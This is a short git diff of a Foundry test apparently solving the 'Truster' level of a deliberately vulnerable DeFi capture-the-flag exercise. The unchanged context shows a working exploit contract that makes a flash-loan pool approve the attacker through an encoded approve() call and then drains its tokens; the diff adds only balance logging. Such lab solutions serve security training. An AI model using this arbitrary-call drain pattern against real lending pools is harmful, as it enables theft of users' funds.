@@ -15,6 +15,7 @@ contract TrusterExploit {
         bytes memory data=abi.encodeWithSignature("approve(address,uint256)", address(this),p_token.balanceOf(address(p_pool)));
         p_pool.flashLoan(0,address(this),address(p_token),data);
         p_token.transferFrom(address(p_pool),p_recovery,p_token.balanceOf(address(p_pool)));
+        
     }
 }
 
@@ -63,7 +64,10 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
+        console.log("Contract balance before exploit: ",token.balanceOf(address(pool)));
+        console.log("\n---Exploit---\n");
         new TrusterExploit(pool,token,recovery);
+        console.log("Contract balance after exploit: ",token.balanceOf(address(pool)));
     }
 
     /**
